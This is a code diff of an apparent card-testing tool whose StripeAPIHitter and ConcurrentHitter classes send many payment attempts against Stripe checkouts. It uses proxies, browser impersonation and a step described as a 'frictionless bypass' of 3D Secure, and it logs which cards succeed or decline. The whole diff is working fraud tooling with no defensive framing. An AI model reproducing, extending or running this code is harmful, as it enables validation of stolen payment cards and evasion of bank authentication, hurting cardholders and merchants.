@@ -735,12 +735,22 @@ class StripeAPIHitter:
                         return result
                     elif status == 'requires_action':
                         try:
-                            if next_action.get('type') == 'use_stripe_sdk':
-                                sdk = next_action.get('use_stripe_sdk', {})
+                            res = confirm_json
+                            pk = self.pk_live
+                            pi = intent_id
+                            taken = time.time() - start
+                            
+                            session = requests.Session()
+                            if proxies:
+                                session.proxies = proxies
+
+                            if res.get("status") == "requires_action":
+                                next_action = res.get("next_action", {})
+                                sdk = next_action.get("use_stripe_sdk", {})
                                 source = (
-                                    sdk.get('three_d_secure_2_source')
-                                    or sdk.get('source')
-                                    or next_action.get('source')
+                                    sdk.get("three_d_secure_2_source")
+                                    or sdk.get("source")
+                                    or next_action.get("source")
                                 )
                                 state = None
 
@@ -775,28 +785,41 @@ class StripeAPIHitter:
                                         "one_click_authn_device_support[spc_eligible]": "false",
                                         "one_click_authn_device_support[webauthn_eligible]": "false",
                                         "one_click_authn_device_support[publickey_credentials_get_allowed]": "true",
-                                        "key": self.pk_live
+                                        "key": pk
                                     }
 
-                                    auth_resp = await loop.run_in_executor(None, lambda: requests.post(auth_url, headers=auth_headers, data=auth_data, proxies=proxies, timeout=30))
+                                    auth_resp = session.post(auth_url, headers=auth_headers, data=auth_data, timeout=30)
                                 try:
                                     data = auth_resp.json()
                                     state = data.get("state")
                                 except Exception:
                                     state = "3DS Attempt failed"
-
                                 if state == "challenge_required":
-                                    result['decline_code'] = '3d_secure_required_hard'
-                                    result['error'] = 'Card issuer demands interactive 3D Secure authentication (Bank-side OTP/App approval required).'
-                                    return result
+                                    return {
+                                        "status": False,
+                                        "result": {
+                                            "status": "declined",
+                                            "message": state,
+                                            "time": taken
+                                        }
+                                    }
 
-                                poll_url = f"https://api.stripe.com/v1/payment_intents/{intent_id}?is_stripe_sdk=false&client_secret={client_secret}&key={self.pk_live}"
+                                    poll_url = f"https://api.stripe.com/v1/payment_intents/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
+                                    poll_headers = {
+                                        "accept": "application/json",
+                                        "origin": "https://js.stripe.com",
+                                        "referer": "https://js.stripe.com/"
+                                    }
+                                    poll_resp = session.get(poll_url, headers=poll_headers, timeout=30)
+
+                            if state and state != "challenge_required":
+                                poll_url = f"https://api.stripe.com/v1/payment_intents/{pi}?is_stripe_sdk=false&client_secret={client_secret}&key={pk}"
                                 poll_headers = {
                                     "accept": "application/json",
                                     "origin": "https://js.stripe.com",
                                     "referer": "https://js.stripe.com/"
                                 }
-                                poll_resp = await loop.run_in_executor(None, lambda: requests.get(poll_url, headers=poll_headers, proxies=proxies, timeout=30))
+                                poll_resp = session.get(poll_url, headers=poll_headers, timeout=30)
                                 poll_json = poll_resp.json()
                                 status_2 = poll_json.get('status')
                                 if status_2 in ['succeeded', 'requires_capture', 'complete']:
@@ -809,7 +832,7 @@ class StripeAPIHitter:
                                         if redirect_url:
                                             await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                             
-                                            poll_url_3 = f"https://api.stripe.com/v1/payment_intents/{intent_id}?key={self.pk_live}"
+                                            poll_url_3 = f"https://api.stripe.com/v1/payment_intents/{pi}?key={pk}"
                                             poll_res_3 = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url_3, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                             poll_json_3 = poll_res_3.json()
                                             poll_status_3 = poll_json_3.get('status')
@@ -837,11 +860,9 @@ class StripeAPIHitter:
                                 return_url = next_action.get('redirect_to_url', {}).get('return_url')
                                 
                                 if redirect_url:
-                                    # Attempt frictionless bypass by hitting the hooks URL with our impersonated browser
-                                    hook_res = await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                                    await loop.run_in_executor(None, lambda: cffi_requests.get(redirect_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                     
-                                    # Poll the Intent to see if frictionless succeeded
-                                    poll_url = f"https://api.stripe.com/v1/setup_intents/{intent_id}?key={self.pk_live}" if is_setup_intent else f"https://api.stripe.com/v1/payment_intents/{intent_id}?key={self.pk_live}"
+                                    poll_url = f"https://api.stripe.com/v1/payment_intents/{pi}?key={pk}"
                                     poll_res = await loop.run_in_executor(None, lambda: cffi_requests.get(poll_url, headers=headers, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
                                     poll_json = poll_res.json()
                                     poll_status = poll_json.get('status')
@@ -981,6 +1002,19 @@ class ConcurrentHitter:
                     await asyncio.sleep(random.uniform(0.05, 0.2))  # Micro-random delay per card attempt  
                     
                     result = await hitter.hit(card, attempt_num, self.user_id)
+                    if isinstance(result, dict) and "status" in result and "result" in result:
+                        friend_res = result
+                        result = {
+                            'attempt': attempt_num,
+                            'card': card,
+                            'success': friend_res.get("status", False),
+                            'decline_code': friend_res.get("result", {}).get("status"),
+                            'response_time': friend_res.get("result", {}).get("time", 0),
+                            'amount': self.url_info.get('amount'),
+                            'merchant': self.url_info.get('merchant'),
+                            'proxy_raw': proxy_data['raw'] if proxy_data else None,
+                            'error': friend_res.get("result", {}).get("message")
+                        }
                     result['amount'] = self.url_info.get('amount')
                     result['merchant'] = self.url_info.get('merchant')
                     
